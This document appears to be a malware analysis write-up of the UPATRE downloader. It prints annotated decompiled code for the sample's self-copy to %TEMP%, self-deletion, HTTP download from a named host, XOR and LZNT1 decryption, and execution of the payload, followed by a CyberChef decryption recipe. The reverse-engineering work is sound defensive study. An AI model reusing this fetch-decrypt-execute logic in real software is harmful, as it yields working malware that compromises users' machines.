## UPATRE Downloader: Replication, Decryption, and Execution

Simply put, UPATRE is a downloader written in C/C++ that retrieves payloads via HTTP. Downloaded payloads are typically written to disk and then executed.

Sample SHA 256: 0000b060341630c2385b5cea8ce2e866671519b31641f5a0c525b880fc655d9e

All of the interesting functionality occurs within the entry point, starting with code that rewrites and executes the file under %TEMP%
## Downloader
**Replication**
```C
 GetModuleHandleW(0);
  hHeap = HeapCreate(0, 0x2000u, 0);
  v0 = (WCHAR *)HeapAlloc(hHeap, 8u, 0x2000u);
  lpBuffer = (LPWSTR)HeapAlloc(hHeap, 8u, 0x2000u); // Memory Allocation ^
  GetModuleFileNameW(0, v0, 0x2000u); // Gets full path of current running process, stored in v0
  GetTempPathW(0x1000u, lpBuffer); // Gets path to %TEMP%, stored in lpBuffer
  wsprintfW(lpBuffer, L"%s%s", lpBuffer, L"budha.exe"); // Builds the string %TEMP%\budha.exe 'C:\Users\User1\Local\AppData\Temp\budha.exe'
  FileW = CreateFileW(v0, 0x80000000, 1u, 0, 3u, 0x80u, 0); // Creates a handle to itself, stored as FileW
  hFile = FileW; // hFile = Handle to itself
  if ( FileW == (HANDLE)-1 ) // If the handle creation failed..
    return 1; // Return 1 to the calling process 'failed'
  nNumberOfBytesToRead = GetFileSize(FileW, 0); // Sets the nNumberOfBytesToRead to the file size of the file handle
  v3 = lstrlenW(v0); // v3 = length of current executing path
  v4 = HeapAlloc(hHeap, 8u, nNumberOfBytesToRead + 2 * v3 + 4); // v4 = Memory allocation of current executing process file + length of current executing path [EXE Bytes + File Path]
  v31 = v4;
  if ( !v4 )
    ExitProcess(1u); // If memory allocation fails, exit process
  ReadFile(hFile, v4, nNumberOfBytesToRead, &NumberOfBytesRead, 0); // Read the current executing process into memory
  if ( lstrcmpW(v0, lpBuffer) ) // Execute if statement only if the current executing process is not %TEMP%\budha.exe
  {
    v5 = lstrlenW(v0); // v5 = Length of current executing process file path
    memcpy((char *)v31 + nNumberOfBytesToRead, v0, 2 * v5 + 2); // Appends the current executing path [v0] to the end of the memory buffer [v31 + nNumberOfBytesToRead]
    hHeap = CreateFileW(lpBuffer, 0x40000000u, 2u, 0, 2u, 0x80u, 0); // 0x40000000 = GENERIC_WRITE, 2 = FILE_SHARE_WRITE, 2 = CREATE_ALWAYS [Overwrite if exists]
    if ( hHeap == (HANDLE)-1 ) // If the handle creation failed...
      return 1; // Return to the calling process
    v6 = lstrlenW(v0);
    WriteFile(hHeap, v31, nNumberOfBytesToRead + 2 * v6 + 4, &NumberOfBytesRead, 0); // Write the current executing process + appended original filepath metadata to %TEMP%\budha.exe
    CloseHandle(hFile);
    CloseHandle(hHeap); // Close both handles to the current process
    GetTempPathW(0x1000u, v0);
    ShellExecuteW(0, L"open", lpBuffer, 0, v0, 0); // Execute the new process under %TEMP%\budha.exe
LABEL_8:
    ExitProcess(0);
  }
```
**Self-Deletion**

Next, when the binary is executing from %TEMP%, it will attempt to delete itself from its "original" location by querying the metadata that was added in the replication stage, which contains the processes original execution path.
```C
  }
  v7 = (char *)v31 + 40 * *(unsigned __int16 *)((char *)v31 + *((_DWORD *)v31 + 15) + 6) + *((_DWORD *)v31 + 15) + 208; // Calculates the offset to the start of the last PE section
  v8 = (const WCHAR *)((char *)v31 + *((_DWORD *)v7 + 4) + *((_DWORD *)v7 + 5)); // Calculates where the appended metadata is [Original execution path]
  CloseHandle(hFile);
  for ( nNumberOfBytesToRead = 0; (int)nNumberOfBytesToRead <= 20000; ++nNumberOfBytesToRead )
  {
    if ( DeleteFileW(v8) ) // Repeatadly attempts to delete the original file
      break;
  }
```

**Payload Downloading**

Next up is a payload being downloaded over HTTP using Windows API calls
```C
v31 = InternetOpenW(L"Updates downloader", 0, 0, 0, 0); // InternetOpenW API with "Updates downloader" user-agent is held in variable v31
  if ( v31 ) // If this was successful, build an lpszAcceptTypes string of "text/application/*"
  {
    lpBuffer = (LPWSTR)-1;
    lpszAcceptTypes[0] = L"text/*";
    lpszAcceptTypes[1] = L"application/*";
    lpszAcceptTypes[2] = 0;
    do
    {
      while ( 1 )
      {
LABEL_14:
        lpBuffer = (LPWSTR)((char *)lpBuffer + 1);
        if ( (int)lpBuffer > 1 )
          lpBuffer = 0;
        v9 = 0;
        while ( 1 )
        {
          v10 = InternetConnectW((HINTERNET)v31, (&lpszServerName)[(_DWORD)lpBuffer], 0x1BBu, 0, 0, 3u, 0, 0);
// InternetConnectW API held in v10 variable [Updates downloader, lpszAcceptTypes = text/application/*]
// v31 used as the User-Agent argument
// Port 443 (0x1BB)
// &lpszServerName is a global data variable holding california89[.]com
          if ( v10 )
            break;
          if ( ++v9 >= 3 )
            goto LABEL_14;
        }
        nNumberOfBytesToRead = 0;
        while ( 1 )
        {
          v11 = HttpOpenRequestW(v10, 0, (&lpszObjectName)[(_DWORD)lpBuffer], 0, 0, lpszAcceptTypes, 0x80803000, 0);
// HttpOpenRequestW API held in the v11 variable
// &lpszObjectName is a global data variable containing "/wp-content/uploads/2013/05/pdf.enc"
          hFile = v11;
          if ( v11 )
            break;
          if ( (int)++nNumberOfBytesToRead >= 3 )
            goto LABEL_14;
        }
        dwBufferLength = 4;
        InternetQueryOptionW(v11, 0x1Fu, &Buffer, &dwBufferLength);
        Buffer |= 0x100u;
        InternetSetOptionW(v11, 0x1Fu, &Buffer, 4u);
        for ( i = 0; i < 2; ++i )
        {
          if ( HttpSendRequestW(v11, 0, 0, 0, 0) ) // HttpSendRequestW is called from arguments in v11, 2 max attempts
            break;
        }
        if ( i != 2 )
        {
          v27 = 4;
          dwBytes = 0;
          for ( j = 0; j < 3; ++j )
          {
            if ( HttpQueryInfoW(v11, 0x20000005u, &dwBytes, &v27, 0) )
              break;
          }
          if ( dwBytes >= 0x30D40 ) // ensure payload size >= 200 KB before downloading
            break;
        }
      }
      v14 = (char *)HeapAlloc(hHeap, 8u, dwBytes);
      if ( !v14 )
        return 1;
      NumberOfBytesRead = 0;
      for ( nNumberOfBytesToRead = 0; (int)nNumberOfBytesToRead < 20; ++nNumberOfBytesToRead )
      {
        v15 = v14;
        for ( k = InternetReadFile(hFile, v14, dwBytes, &NumberOfBytesRead); // Download the data from california89[.]com/wp-content/uploads/2013/05/pdf.enc
              k;
              k = InternetReadFile(hFile, v15, dwBytes, &NumberOfBytesRead) )
        {
          v15 += NumberOfBytesRead;
          if ( !NumberOfBytesRead || NumberOfBytesRead == dwBytes )
            break;
        }
        if ( v15 - v14 == dwBytes ) // Exit when full payload is downloaded
          break;
      }
    }
```

There is then an if statement as follows:
```
if ( !v17 || v14[1] != 90 || v14[2] != 80 || v14[3] )
```

<img width="472" height="141" alt="image" src="https://github.com/user-attachments/assets/a0171419-6409-461e-9c3c-366278f31157" />

The code is checking the header of the downloaded payload for the presence of 3 bytes "ZZP" (90h = Z, 80h = P)

If those bytes exist, the code continues execution into the decompression & decryption routine. If those bytes do not exist, the binary will skip those code and jump to a location where the payload is written to disk and executed.

 **Payload Decompression & Decryption**
```C
 nNumberOfBytesToRead = (DWORD)HeapAlloc(hHeap, 8u, 4 * dwBytes);
    if ( nNumberOfBytesToRead )
    {
      v18 = dword_403010[(_DWORD)lpBuffer];
// dword_403010 contains a hex XOR key [78 56 34 12]
      v19 = 4 * dwBytes;
      v20 = 1;
      v31 = 0;
      if ( (dwBytes & 0xFFFFFFFC) > 4 )
      {
        do
          *(_DWORD *)&v14[4 * v20++] ^= v18; //  XOR the data [v14] with the XOR key [v18]
        while ( v20 < dwBytes >> 2 );
      }
      LibraryW = LoadLibraryW(L"ntdll.dll"); // Dynamically load ntdll.dll
      hFile = LibraryW;
      if ( LibraryW )
      {
        RtlDecompressBuffer = GetProcAddress(LibraryW, "RtlDecompressBuffer"); // Dynamically resolve RtlDecompressBuffer function
        dword_403018 = (int)RtlDecompressBuffer;
        if ( !RtlDecompressBuffer )
        {
          FreeLibrary((HMODULE)hFile);
          return 1;
        }
        dwBytes -= 4; // Drop the first 4 bytes
        v23 = v14 + 4; // v23 now points to data AFTER the first 4 bytes
        v14 = (char *)nNumberOfBytesToRead;
        ((void (__stdcall *)(int, DWORD, SIZE_T, _BYTE *, SIZE_T, LPCVOID *))RtlDecompressBuffer)( //Decompress the payload with following arguments:
          258,
          nNumberOfBytesToRead,
          v19,
          v23,
          dwBytes,
          &v31);
        FreeLibrary((HMODULE)hFile);
        dwBytes = v19;
        goto LABEL_53; // Jump to the 'File Writing & Execution' code
      }
    }
  }
  return 1;
}
```

**File Writing & Execution**

If the ZZP magic bytes were not found, or, if the code jumped to LABEL_53, we found ourselves at this code block, which simply writes the payload to a file on disk, and executes it.

```C
    hFile = CreateFileW(L"kilf.exe", 0x40000000u, 2u, 0, 2u, 0x80u, 0); // Creates a writable handle to kilf.exe in the current directory
      WriteFile(hFile, v14, dwBytes, &NumberOfBytesWritten, 0); // Writes the downloaded payload (v14) to kilf.exe
      CloseHandle(hFile); // Closes the handle to kilf.exe
      if ( nNumberOfBytesToRead )
        HeapFree(hHeap, 0, (LPVOID)nNumberOfBytesToRead);
      GetCurrentDirectoryW(0x400u, v24);
      wsprintfW(v24, L"%s\\%s", v24, L"kilf.exe");
      ShellExecuteW(0, L"open", v24, 0, 0, 0); // Executes the payload
      goto LABEL_8; // Terminate current process
```


So from this function we can infer that the payload is XOR'd with hex key 78 56 34 12, decompressed with RtlDecompressBuffer, and executed.

One payload being served by this URL has the SHA 256 hash: 84864d1758432f365aec494cb963158b77c77014db19e5f3990966e147a85235

It has the ZZP magic bytes and can be decrypted with the following CyberChef recipe:

```
Drop_bytes(0,4,false)
XOR({'option':'Hex','string':'78 56 34 12'},'Standard',false)
LZNT1_Decompress()
```

<img width="1214" height="723" alt="image" src="https://github.com/user-attachments/assets/16fe5c1d-48e5-4150-bf4f-df7065d7c3e8" />
